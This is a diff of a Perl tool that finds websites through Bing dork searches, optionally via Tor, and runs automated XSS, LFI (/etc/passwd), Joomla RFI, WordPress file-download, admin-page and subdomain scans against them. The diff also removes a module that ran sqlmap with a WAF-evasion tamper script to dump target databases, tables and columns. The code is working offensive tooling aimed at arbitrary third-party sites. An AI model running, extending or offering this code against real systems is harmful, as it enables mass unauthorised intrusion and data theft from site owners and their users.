 ## SEARCH ENGINE
 sub submsearch {
-  testconection();
   $checksearchscanlist = $Bin."/search.txt";
   if (-e $checksearchscanlist){ unlink $checksearchscanlist};
   dorklist();
+  $nolisting = "q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|barra.uol.|whowhere.|hotbot.|amesville.|lycos|lygo.|orkut.|schema.|blogger.|bing.|w3.|yahoo.|yimg.|creativecommons.org|ndj6p3asftxboa7j.|.torproject.org|.lygo.com|.apache.org|live.|microsoft.|ask.|shifen.com|answers.|analytics.|googleadservices.|sapo.pt|favicon.|blogspot.|wordpress.|.css|scripts.js|jquery-1.|dmoz.|gigablast.|aol.|.macromedia.com|.sitepoint.|yandex.|www.tor2web.org|.securityfocus.com|.Bootstrap.|.metasploit.com|aolcdn.|altavista.|clusty.|teoma.|baiducontent.com|wisenut.|a9.|uolhost.|w3schools.|msn.|baidu.|hao123.|shifen.|procog.|facebook.|twitter.|flickr.|.adobe.com|oficinadanet.|elephantjmjqepsw.|.shodan.io|kbhpodhnfxl3clb4|.scanalert.com|.prototype.|feedback.core|4shared.|.KeyCodeTab|.style.|www\/cache\/i1|.className.|=n.|a.Ke=|Y.config|.goodsearch.com|style.top|n.Img|n.canvas.|t.search|Y.Search.|a.href|a.currentStyle|a.style|yastatic.|.oth.net|.hotbot.com|.zhongsou.com|ezilon.com|.example.com|location.href|.navigation.|.hostname.|.bingj.com|Y.Mobile.|srpcache?p|stackoverflow.|shifen.|baidu.|baiducontent.|gstatic.|php.net|wikipedia.|webcache.|inurl.|naver.|navercorp.|windows.|window.|.devmedia|imasters.|.inspcloud.com|.lycos.com|.scorecardresearch.com|.target.|JQuery.min|Element.location.|document.|exploit-db|packetstormsecurity.|1337day|owasp|.sun.com|mobile10.dtd|onabort=function|inurl.com.br|purl.org|.dartsearch.net|r.cb|.classList.|.pt_BR.|github|microsofttranslator.com|.compete.com|.sogou.com|gmail.|blackle.com|boorow.com|gravatar.com|cookieSet|security|facebook|WindowsLiveTranslator|cache|74.125.153.132|inurl:|Network|adw.sapo|tripadvisor|yandex|Failed";
   msearch();
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## ENGINE PROCEDURE
 sub msearch {
-  $browserlang = $browserlangs[int rand @browserlangs];
   scandetail();
   print "\033[1;33m[+] RANDOM SEARCH:: ";
     print "\033[0;36mBING [bing.". $browserlang . "] ";
@@ -1423,12 +1369,12 @@ sub msearch {
   if (defined $ifinurl) {
     print "\033[0;36m[Ifinurl VLD]";
   }
-  print "\n";   
+  print "\n";  
   if (defined $dork) {
     $printdork = $dork;
 	$printdork =~ s/\+/ /g;
-    print "\033[1;33m[+] SEARCH:: ";
-    print "\033[0;36m[$printdork] ";
+    print "\033[1;33m[+] DORK:: ";
+    print "\033[0;36m[$printdork]";
     my $pattern = '.txt';
 	if ($dork =~ m/$pattern/i){
 	  countdorks();
@@ -1437,9 +1383,10 @@ sub msearch {
 	}
   }
   print "\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
+  testconection();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING ENGINE SCAN::: \n";
+  print "::: STARTING ENGINE SCAN ::: \n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -1447,36 +1394,40 @@ sub msearch {
   while (my $dork = <FILE>) {
     chomp $dork;
 	$count++;
-	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
       print "\033[1;36m\n[!] ";
 	  timer();
 	  print "[Dork $count/";
 	  countdorkslist();
       $printdork = $dork;
 	  $printdork =~ s/\+/ /g;
-	  print "\033[1;36m] ";
-	  print "[SCAN:: $printdork]\n";
+	  print "\033[1;36m][$printdork]\n";
       print "\033[1;37m[ ] ....................................................................... \n";
     }
 	$mlevel = $mlevel;
     $s_results = $dork;
 	if ((defined $Target) || (defined $rangip)) {
       $s_results = "ip%3A".$dork;
-      $s_results =~ s/ //g;
 	}
+	$s_results =~ s/^\s+//;
     my @scanlist=&scan($s_results);
     sub scan(){
       my @search;
 	  $count2=0;
+      if (defined $random) {newtor();}
       for($npages=0;$npages<=$mlevel;$npages+=10){
         my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&FORM=PERE&cc=".$browserlang);
 		my $search=$ua->get("$google");
         $search->as_string;
         my $Res=$search->content;
-        while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
-          if($1 !~ /msn|live|bing|cookieSet|security|youtube.com|0day|exploit|pastebin|microsoft|WindowsLiveTranslator|google|cache|74.125.153.132|inurl:|q=|404|403|Network|Failed|adw.sapo|tripadvisor|yandex/){
+        #while($Res =~ m/<a href=\"?https?:\/\/([^>\"]*)/g){
+		while($Res =~ m/<a href=\"(?:https?|ftps?):\/\/([^>\"]*)/g){
+          if($1 !~ /$nolisting/){
             if (defined $unique) {
-		      $check=$s_results;
+			  my $pat2 = 'inurl:|intitle:|intext:|allinurl:|index\+of\+';
+			  $check = $s_results;
+			  $check =~ s/:\+/:/g;
+			  $check =~ s/$pat2//g;
 	        }elsif (defined $ifinurl) {
 		      $check=$ifinurl;
 	        }else{
@@ -1492,46 +1443,46 @@ sub msearch {
 	              $URL =~ s/http:\/\///g;
 	            }
                 $URL=~s/\/.*//s;
-			    if ($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+			    $URL=checkurlschema($URL);
 			  }
 			  if ($repeat{$URL}) {
 			  }else{
 			    $count2++;
-			    if ($URL !~ /http:\/\//) { $URL = "http://$URL"; };			 
-	            if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+			    $URL=checkurlschema($URL);			 
+	            if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
 	              print "\033[1;33m    ";
 	              timer();
 	              print "[Target $count2]\n";
 	              print "\033[1;37m    TARGET: ";
-	              print "\033[0;37m$URL\n";
+	              print "\033[0;35m$URL\n";
 	              $URL1=$URL;
                   if (!defined $noinfo) {
-                     checkextrainfo();
-				     $request = HTTP::Request->new('GET', $URL);
-                     my $response = $ua->request($request);
-                     my $html = $response->content;
-                     my $status = $response->code;
-					 my $serverheader = $response->server;
- 	                 print "\033[1;37m    HTTP:   ";
-	                 print "\033[0;37mHTTP/1.1 $status\n";
-                     print "\033[1;37m    SERVER: ";
-                     if (defined $serverheader) {
-                       print "\033[0;37m$serverheader\n";
-                     }else{
-	                   print "\033[0;37mUndefined\n";
-                     }
-                     for my $ERROR (@ERROR) {
-	                   if ( $html =~ /$ERROR/ ){
-	                     $ERROR1=$ERROR;
-	                     checkerrortype();
-	                   }
-                     }
-                     for my $MODULETYPE (@MODULETYPE) {
-	                   if ( $html =~ /$MODULETYPE/ ){
-	                     $MODULETYPE1=$MODULETYPE;
-	                     checkcmstype();
-				       }
-                     }		          
+                    checkextrainfo();
+				    $request = HTTP::Request->new('GET', $URL);
+                    my $response = $ua->request($request);
+                    my $html = $response->content;
+                    my $status = $response->code;
+					my $serverheader = $response->server;
+ 	                print "\033[1;37m    HTTP:   ";
+	                print "\033[0;37mHTTP/1.1 $status\n";
+                    print "\033[1;37m    SERVER: ";
+                    if (defined $serverheader) {
+                      print "\033[0;37m$serverheader\n";
+                    }else{
+	                  print "\033[0;37mUndefined\n";
+                    }
+                    for my $ERROR (@ERROR) {
+	                  if ( $html =~ /$ERROR/ ){
+	                    $ERROR1=$ERROR;
+	                    checkerrortype();
+	                  }
+                    }
+                    for my $MODULETYPE (@MODULETYPE) {
+	                  if ( $html =~ /$MODULETYPE/ ){
+	                    $MODULETYPE1=$MODULETYPE;
+	                    checkcmstype();
+				      }
+                    }		          
                   }
 			      print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
 			    }
@@ -1567,7 +1518,7 @@ sub msearch {
     $lc++ while <$file>;
 	print "\033[0;32m[!] $lc Unique Result(s) Found!\n";
 	close $file;
-	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
 	  if (defined $output) {
 	    $listme = $Bin."/search.txt";
 		$save = "$outdir/search.txt";
@@ -1593,14 +1544,13 @@ sub msearch {
 sub misup {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
   if (-e $Bin.'/validated.txt'){ unlink $Bin.'/validated.txt';}
-  testconection();
   if (!defined $mlevel){
     targetlist();
   }
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING HTTP VALIDATION SCAN:::\n";
+  print "::: STARTING HTTP VALIDATION SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -1609,7 +1559,7 @@ sub misup {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	print "\033[1;33m    ";
 	timer();
@@ -1617,7 +1567,7 @@ sub misup {
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	$URL = control($URL);
 	$yes='a';
     $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
@@ -1650,7 +1600,7 @@ sub misup {
   if (-e $Bin.'/scan.txt') {
   	fincontinuemodule();
 	unlink $Bin.'/search.txt';
-    if ((!defined $validation_text) && (!defined $command) && (!defined $mxss) && (!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+    if ((!defined $validation_text) && (!defined $command) && (!defined $mxss) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
 	  if (defined $output) {
 	    $listme = $Bin.'/scan.txt';
 		$save = "$outdir/search.txt";
@@ -1676,14 +1626,13 @@ sub misup {
 sub mvalidation {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
   if (-e $Bin.'/validated.txt'){ unlink $Bin.'/validated.txt';}
-  testconection();
   if ((!defined $mlevel) && (!defined $misup)) {
     targetlist();
   }
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING VALIDATION SCAN:::\n";
+  print "::: STARTING VALIDATION SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -1692,7 +1641,7 @@ sub mvalidation {
 	chomp $URL;
     $count++;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	print "\033[1;33m    ";
 	timer();
@@ -1700,7 +1649,7 @@ sub mvalidation {
 	countsearchlist();
 	print "\033[1;33m]\n";
     print "\033[1;37m    TARGET: ";
-    print "\033[0;37m$printarget\n";
+    print "\033[0;35m$printarget\n";
 	$URL = control($URL);	
     $yes = $validation_text;
     $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
@@ -1733,7 +1682,7 @@ sub mvalidation {
   if (-e $Bin.'/scan.txt') {
   	fincontinuemodule();
 	unlink $Bin.'/search.txt';
-    if ((!defined $command) && (!defined $mxss) && (!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+    if ((!defined $command) && (!defined $mxss) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
 	  if (defined $output) {
 	    $listme = $Bin.'/scan.txt';
 		$save = "$outdir/search.txt";
@@ -1760,7 +1709,7 @@ sub mcommand {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING EXTERNAL COMMAND SUBPROCESS:::\n";
+  print "::: STARTING EXTERNAL COMMAND SUBPROCESS:::\n";
   print "\033[1;37m[ ]-----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -1768,14 +1717,14 @@ sub mcommand {
   while (my $URL = <TEXT>) {
     $count++;
 	chomp $URL;
-    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+    $URL=checkurlschema($URL);
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$URL \n";
+	print "\033[0;35m$URL \n";
 	if (!defined $noinfo) {
       $URL1=$URL;
       checkextrainfo();
@@ -1783,7 +1732,7 @@ sub mcommand {
 	if ((!defined $misup) && (!defined $validation_text)) {
       $URL = control($URL);
 	}
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+	$URL=checkurlschema($URL);
 	if (defined $command) {
 	  $command =~ s/--TARGET//g;
 	}
@@ -1815,7 +1764,7 @@ sub mcommand {
     print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
   }
   subfin();
-  if ((!defined $mxss) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+  if ((!defined $mxss) && (!defined $mlfi) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
     unlink $Bin.'/exploits.txt';
 	exit();
   }
@@ -1830,7 +1779,7 @@ sub mxss {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING XSS SCAN:::\n";
+  print "::: STARTING XSS SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -1839,7 +1788,7 @@ sub mxss {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	print "\033[1;33m    ";
 	timer();
@@ -1847,7 +1796,7 @@ sub mxss {
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	if ((!defined $misup) && (!defined $validation_text)) {
       $URL = control($URL);
 	}
@@ -1903,116 +1852,9 @@ sub mxss {
       subfin();
 	  deleteqexp();
 	}
-	if (defined $sqlmap) {
-      if (-e $Bin.'/xss_scan.txt') { unlink $Bin.'/xss_scan.txt';}
-      use File::Copy qw(copy);
-	  copy $Bin.'/scan.txt', "$Bin/xss_scan.txt";
-	}
 	unlink $Bin.'/scan.txt';
   }else{
 	negativeexit();
-  }
-}
-############################################################################################################################################################################################
-############################################################################################################################################################################################
-##bgn SQLMAP 
-sub sqlmap {
-  ifgettargetlist();
-  print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
-  timer();
-  print ":::STARTING SQLMAP SCAN:::\n";
-  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
-  forwait();
-  $count=0;
-  open (INFO, $Bin.'/xss_scan.txt');
-  while (my $URL = <INFO>) {
-    $count++;
-	chomp $URL;
-    $URL = checkurltype($URL);
-	if (index($URL, '%27') != -1) {
-	  $URL =~ s/\%27//g;
-	}
-	if (defined $proxy) {
-	  $tor = "--tor --check-tor --tor-type=SOCKS5";
-	}else{
-	  $tor = "";
-	}
-	if (defined $p) {
-	  $p = "-p $p";
-	}else{
-	  $p = "";
-	}
-	print "\033[1;35m";
-	timer();
-	print "[$count/";
-	countsqllist();
-	print "]\n";
-	print "\033[1;37m    TARGET: ";
-	print "\033[0;33m$URL \n";
-	print "\033[1;37m    [+] EXPLOITATION: ";
-    print "Sqlmap \n\n";
-    print "\033[0;33m[+] Checking databases...\n";
-    system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		
-	### BEG DATABASE
-	DATABASE:; 
-    print "\033[0;33m[+] Do You Want To Exploit DATABASE? (Y/n): ";
-    $sqldatabase=<STDIN>;
-    chomp ($sqldatabase);
-	if ($sqldatabase =~ /^[Y]?$/i) {
-	  DATABASENAME:;
-      print "\033[0;33m[+] Enter DataBase Name: ";
-      $databasename=<STDIN>;
-      chomp ($databasename);
-	  if (!$databasename){ 
-        print "\033[0;31m[+] Uppss.. you have to Enter DataBase Name!\n";
-        goto DATABASENAME;
-      };
-      print "\033[0;33m[+] Checking...";
-      system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
-	  ### END DATABASE
-	  ### BEG TABLES
-	  TABLESYES:;
-      print "\033[0;33m[+] Do You Want To Exploit Tables? (Y/n): ";
-      $sqltableyes=<STDIN>;
-      chomp ($sqltableyes);
-	  if ($sqltableyes =~ /^[Y]?$/i) {
-		TABLES:;
-        print "\033[0;33m[+] Enter Table Name: ";
-         $sqltables=<STDIN>;
-        chomp ($sqltables);
-	    if (!$sqltables){ 
-	      print "\033[0;31m[+] Uppss.. you have to Enter Table Name!\n";
-          goto TABLES;
-        }
-        print "\033[0;33m[+] Checking DataBase Tables...";
-        system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		### END TABLES
-		### BEG COLUMNS
-		COLUMNSYES:;
-        print "\033[0;33m[+] Do You Want To Exploit Columns? (Y/n): ";
-        $sqlcolyes=<STDIN>;
-        chomp ($sqlcolyes);
-	    if ($sqlcolyes =~ /^[Y]?$/i) {
-		  COLS:;
-          print "\033[0;33m[+] Enter Column Name [ex: admin,users,orders]: ";
-          $sqlcolumn=<STDIN>;
-          chomp ($sqlcolumn);
-	      if (!$sqlcolumn){ 
-            print "\033[0;31m[+] Uppss.. you have to Enter Column Name!\n";
-            goto COLS;
-          }
-          print "\033[0;33m[+] Checking Columns...";
-          system("sqlmap -u $URL $p --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-	    } ### END COLUMNS
-	  }
-	}
-  }
-  close(TEXT);
-  print "    \033[1;37m[ ] -------------------------------------------------------------------\n";
-  if ((!defined $mwpadf) && (!defined $mlfi) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports) && (!defined $wpbf) && (!defined $joombf)) {
-	subfin();
-	exit();
   }
 }
 ############################################################################################################################################################################################
@@ -2025,7 +1867,7 @@ sub mlfi {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING LFI SCAN:::\n";
+  print "::: STARTING LFI SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2034,24 +1876,23 @@ sub mlfi {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	$URL =~ s/=.*/=/s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $LFI(@LFI){
 	  print "\033[1;37m    EXPLR:  ";
 	  print "\033[0;37m$LFI \n";
 	  $URL =~ s/ //g;
       $yes = 'root:x|bin:x|nologin';
       $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
-      
 	  if (defined $exploit) {
         $count3=0;
         open (EXP, $Bin.'/exploits.txt');
@@ -2108,7 +1949,7 @@ sub mjoomrfi {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING JOOMLA RFI SCAN:::\n";
+  print "::: STARTING JOOMLA RFI SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2117,20 +1958,20 @@ sub mjoomrfi {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
 	}
 	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $RFI(@RFI){
 	  print "\033[1;37m    EXPLR:  ";
 	  print "\033[0;37m$RFI \n";
@@ -2171,7 +2012,7 @@ sub mwpadf {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING WORDRESS ADF SCAN:::\n";
+  print "::: STARTING WORDRESS ADF SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2180,20 +2021,20 @@ sub mwpadf {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
 	}
 	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $ADFWP(@ADFWP){
 	  print "\033[1;37m    EXPLR:  ";
 	  print "\033[0;37m$ADFWP \n";
@@ -2220,11 +2061,6 @@ sub mwpadf {
       subfin();
 	  unlink $Bin.'/search.txt';
 	}
-	if (defined $sqlmap) {
-      if (-e $Bin.'/xss_scan.txt') { unlink $Bin.'/xss_scan.txt';}
-      use File::Copy qw(copy);
-	  copy $Bin.'/scan.txt', "$Bin/xss_scan.txt";
-	}
 	unlink $Bin.'/scan.txt';
   }else{
 	negativeexit();
@@ -2240,7 +2076,7 @@ sub madmin {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING ADMIN PAGE SCAN:::\n";
+  print "::: STARTING ADMIN PAGE SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2249,20 +2085,20 @@ sub madmin {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+    $URL=checkurlschema($URL);
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
 	}
 	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $ADMIN(@ADMIN){
 	  print "\033[1;37m    EXPLR:  ";
 	  print "\033[0;37m$ADMIN \n";
@@ -2300,7 +2136,6 @@ sub madmin {
 ## GET SUBDOMAINS
 sub msubdomain {
    if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
-  testconection();
   SUBDOMAIN();
   if (!defined $mlevel) {
     targetlist();
@@ -2308,7 +2143,7 @@ sub msubdomain {
   }
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING SUBDOMAIN SCAN:::\n";
+  print "::: STARTING SUBDOMAIN SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2317,7 +2152,7 @@ sub msubdomain {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	if (index($URL, 'http://www.') != -1) {
 	  $URL =~ s/http:\/\/www.//g;
@@ -2332,7 +2167,7 @@ sub msubdomain {
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $SUBDOMAIN(@SUBDOMAIN){
       $URL1 = $SUBDOMAIN.$URL;
 	  $socket=IO::Socket::INET->new(
@@ -2379,14 +2214,13 @@ sub msubdomain {
 ############################################################################################################################################################################################
 ## GET WORDPRESS SITES
 sub mwpsites {
-   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
-  testconection();
+  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
   if (!defined $mlevel) {
     targetlist();
   }
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING WORDPRESS SITES SCAN:::\n";
+  print "::: STARTING WORDPRESS SITES SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2395,20 +2229,20 @@ sub mwpsites {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
 	}
 	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
